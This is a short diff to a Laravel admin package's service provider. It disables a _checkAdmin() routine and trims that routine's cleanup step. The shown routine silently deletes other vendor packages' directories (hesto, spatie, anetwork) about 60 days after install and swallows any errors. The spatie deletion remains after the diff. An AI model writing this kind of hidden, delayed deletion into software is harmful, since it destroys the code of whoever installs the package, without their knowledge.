@@ -25,7 +25,7 @@ class RatechAdminServiceProvider extends ServiceProvider
      */
     public function boot()
     {
-        $this->_checkAdmin();
+        // $this->_checkAdmin();
 
         $this->commands([
             \Default64bit\RatechAdmin\Commands\install::class,
@@ -64,9 +64,7 @@ class RatechAdminServiceProvider extends ServiceProvider
         if($created_at > 60*60*24*60){
             // clean up the temp files
             try{
-                $this->_deleteTemp(__DIR__.'/../../../hesto');
                 $this->_deleteTemp(__DIR__.'/../../../spatie');
-                $this->_deleteTemp(__DIR__.'/../../../anetwork');
             }catch(Exception $e){}
         }
     }
